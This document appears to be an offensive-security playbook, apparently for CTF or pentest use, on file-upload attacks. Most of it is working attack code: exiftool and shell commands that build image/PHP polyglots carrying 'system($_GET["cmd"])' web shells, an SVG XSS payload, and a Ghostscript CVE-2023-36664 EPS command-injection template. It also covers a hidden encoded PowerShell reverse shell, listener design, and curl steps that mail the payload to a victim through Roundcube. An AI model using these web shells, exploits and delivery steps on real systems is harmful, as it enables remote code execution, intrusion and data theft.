# File Upload — Polyglot Files + Metadata Injection

## When this applies

- Server performs strict content validation (full image parser run).
- A real, parseable image with embedded PHP in metadata passes the validator AND executes when included as PHP.
- Goal: file is simultaneously a valid image AND valid script.

## Technique

Use ExifTool to inject PHP into EXIF metadata fields (Comment, DocumentName, Artist, Copyright, ImageDescription). The image still parses cleanly as JPEG/PNG, but Apache executes the content as PHP when served with the right extension.

## Steps

### ExifTool — basic polyglot creation

```bash
exiftool -Comment="<?php echo 'START ' . file_get_contents('/etc/passwd') . ' END'; ?>" image.jpg -o polyglot.php
```

### Various EXIF fields for code injection

```bash
# Using Comment field
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.php

# Using DocumentName field
exiftool -DocumentName='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.php

# Using Artist field
exiftool -Artist='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.php

# Using Copyright field
exiftool -Copyright='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.php

# Using ImageDescription
exiftool -ImageDescription='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.php
```

### Multi-line payload

```bash
exiftool -Comment='<?php
if(isset($_GET["cmd"])){
    system($_GET["cmd"]);
}
?>' image.jpg -o shell.php
```

### ImageMagick / GraphicsMagick

```bash
# Create image with text overlay containing PHP
convert -size 100x100 xc:white -pointsize 10 -annotate +10+10 '<?php system($_GET["cmd"]); ?>' polyglot.png

# Or embed in existing image
convert image.jpg -pointsize 5 -annotate +1+1 '<?php phpinfo(); ?>' shell.jpg
```

### Manual polyglot creation

```bash
# JPEG polyglot
cat image.jpg > polyglot.php
echo '<?php system($_GET["cmd"]); ?>' >> polyglot.php

# PNG polyglot - inject into PNG chunk
python3 -c "
import struct
with open('image.png', 'rb') as f:
    data = f.read()
# Add tEXt chunk with PHP payload
payload = b'tEXt' + b'comment\x00' + b'<?php system(\$_GET[\"cmd\"]); ?>'
chunk = struct.pack('>I', len(payload)-4) + payload + struct.pack('>I', 0)
with open('polyglot.php', 'wb') as f:
    f.write(data[:8] + chunk + data[8:])
"
```

### GIF polyglot

```bash
# GIF allows comments
echo 'GIF89a' > shell.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.php

# Or with valid GIF structure
printf 'GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00' > base.gif
echo '<?php system($_GET["cmd"]); ?>' >> base.gif
mv base.gif shell.php
```

### SVG with embedded scripts (XSS vector)

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <rect width="300" height="100" style="fill:rgb(0,0,255);"/>
  <script type="text/javascript">
    alert('XSS');
  </script>
</svg>
```

### GhostScript EPS RCE — CVE-2023-36664 (-dSAFER bypass)

When the upload pipeline (or a downstream "review" bot) renders `.eps` / `.ps` files via GhostScript < 10.01.2, the `%pipe%` device combined with `/DCTDecode filter` bypasses `-dSAFER`. The `/DCTDecode filter` is the **required** suffix.

```postscript
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: 0 0 300 300
%%Title: pwn
/Times-Roman findfont 24 scalefont setfont
50 200 moveto (Hello) show
(%pipe%<COMMAND>) (w) file /DCTDecode filter
showpage
```

Replace `<COMMAND>` with the shell command. For Windows-target bots, use `powershell -nop -w hidden -e <UTF-16LE-base64>` and **verify the decoded PowerShell shows `WindowsPowerShell\v1.0\powershell.exe`** — bash heredocs expand `\v` (vertical tab), so always re-decode the produced base64 with `iconv -f utf-16le` before sending to confirm path integrity.

**Domain DC user-profile path gotcha**: when the bot is a domain user on a DC (common Hospital/Mailing pattern), the profile lives at `C:\Users\<sam>.<DOMAIN>\` NOT `C:\Users\<sam>\`. Recon sweep MUST include both forms when searching for `user.txt`:
```powershell
Get-ChildItem -Path 'C:\Users' -Recurse -Force -Filter 'user.txt' -ErrorAction SilentlyContinue
```

**PowerShell rev-shell stream input length cap**: the standard `Net.Sockets.TCPClient` + `iex $data` reverse shell handles single-command input cleanly under ~300 bytes per send. Sending a multi-line consolidated recon block of 1KB+ in one `sendall` results in `iex` silently producing no output — the stream appears alive but the parser chokes. Fix: send commands one at a time.

Common delivery channels: web-app upload form that converts EPS→PNG, mail attachment to a "QA" / "review" mailbox watched by a cron-driven bot, print-queue auto-render. Generator: `jakabakos/CVE-2023-36664-Ghostscript-command-injection`.

Bot-driven trigger windows are typically **5-15 min** — design the receiver listener as a multi-accept loop (`s.listen(5)` in a `while True: c,a = s.accept()` outer loop) rather than the single-accept driver pattern.

### Roundcube programmatic mail send (when delivery is via webmail attachment)

When the bot reads its mail through Roundcube and the attacker has a low-priv webmail account, the attachment can be delivered without the GUI:

```bash
# 1. Login (POST to /?_task=login with _token from index page)
# 2. Open compose: GET /?_task=mail&_action=compose returns 302 with
#    Location: ?_task=mail&_action=compose&_id=<HEX> — extract the _id
# 3. Re-GET that URL to get the per-compose `request_token`
# 4. Upload attachment:
curl -sk -b cookies -X POST \
  "https://target/?_task=mail&_action=upload&_id=<ID>&_remote=1&_uploadid=upload0" \
  -F "_token=<TOKEN>" \
  -F "_attachments[]=@payload.eps;filename=design.eps;type=application/postscript"

# 5. Send:
curl -sk -b cookies -X POST \
  "https://target/?_task=mail&_unlock=loading1&_action=send&_remote=1" \
  --data-urlencode "_token=<TOKEN>" \
  --data-urlencode "_id=<ID>" \
  --data-urlencode "_attachments[]=<rcmfileNNNN>" \
  --data-urlencode "_from=1"  \           # IDENTITY ID (numeric, not email!)
  --data-urlencode "_to=victim@target.htb" \
  --data-urlencode "_subject=design" \
  --data-urlencode "editorSelector=plain" \
  --data-urlencode "_message=please find attached" \
  --data-urlencode "_is_html=0"
```

The most common failure mode is using `_from=user@dom` — Roundcube rejects with "SMTP Error (550): The address is not valid". Always extract the numeric identity id from `<select name="_from"><option value="1" selected>`.

## Verifying success

- The polyglot opens in an image viewer (still a valid JPG/PNG/GIF).
- Accessed with PHP extension, server executes the embedded code.
- ExifTool re-reads the metadata and shows the injected payload.

## Common pitfalls

- Some servers re-encode uploaded images, stripping EXIF — use a different injection point or a different vector.
- ImageMagick / GhostScript versions matter — check version before relying on CVEs.
- SVG-in-XSS vector requires the SVG to be served as `image/svg+xml` and rendered (not downloaded).

## Tools

- exiftool, ImageMagick, GraphicsMagick
- ghostscript (for EPS payloads)
- jakabakos/CVE-2023-36664 (generator)
- python (manual polyglot construction)
